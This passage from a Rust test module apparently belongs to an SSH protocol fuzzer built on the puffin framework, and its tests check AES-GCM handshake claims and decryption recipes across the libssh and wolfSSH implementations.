        if let (Some(lib), Some(wolf)) = (lib, wolf) {
            assert_eq!(
                lib, wolf,
                "canonicalized AES-GCM claims must match across libssh/wolfSSH\n libssh={lib:?}\n wolfssh={wolf:?}"
            );
            // And they must be the canonical wire names, not vendor spellings.
            assert_eq!(lib.0, "curve25519-sha256");
            assert_eq!(lib.1, "aes256-gcm@openssh.com");
            assert_eq!(lib.3, "aead-gcm");
        }
    }

    /// The AES-GCM s2c decryption recipes must actually decrypt the libssh
    /// server's post-NewKeys output, otherwise they contribute nothing to the
    /// encrypted-layer differential.
    #[test_log::test]
    fn test_aesgcm_decryption_recipes_decrypt() {
        use puffin::algebra::TermType;

        use crate::ssh::seeds::{
            seed_client_attacker_full_aesgcm, server_decryption_recipes_aesgcm,
        };

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full_aesgcm(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let decrypted = server_decryption_recipes_aesgcm(server)
            .iter()
            .filter(|t| t.evaluate_dy(&context).is_ok())
            .count();
        assert!(
            decrypted >= 1,
            "no AES-GCM s2c packet decrypted; recipes are dead"
        );
    }

    /// Same end-to-end claim check, but driving the wolfSSH PUT (if compiled in)
    /// over the AES-GCM seed, proving the claimer is wired for the second vendor.
    #[test_log::test]
    fn test_handshake_claim_emitted_wolfssh() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_client_attacker_full_aesgcm;

        let registry = ssh_registry();

        // Discover the wolfSSH PUT by name; skip if this build has none.
        let Some(wolfssh_put) = registry
            .puts()
            .map(|(name, _)| name.to_owned())
            .find(|name| name.contains("wolfssh"))
        else {
            eprintln!("no wolfSSH PUT compiled in; skipping");
            return;
        };

        let server = puffin::agent::AgentName::first();
        let spawner = Spawner::new(registry.clone()).with_mapping(&[(
            server,
            PutDescriptor::new(wolfssh_put, PutOptions::default()),
        )]);
        let runner = Runner::new(registry, spawner);
        let trace = seed_client_attacker_full_aesgcm(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("wolfSSH server emitted no HandshakeComplete claim");
        let inner = claim
            .as_any()
            .downcast_ref::<Box<SshClaimInner>>()
            .expect("claim inner was not an SshClaimInner");

        assert!(inner.is_server, "server claim should have is_server = true");
        assert!(
            !inner.kex.is_empty() && inner.kex != "none",
            "wolfSSH negotiated kex should be populated: {:?}",
            inner.kex
        );
        assert!(
            !inner.cipher_in.is_empty() && !inner.cipher_out.is_empty(),
            "wolfSSH negotiated ciphers should be populated: in={:?} out={:?}",
            inner.cipher_in,
            inner.cipher_out
        );
    }
}
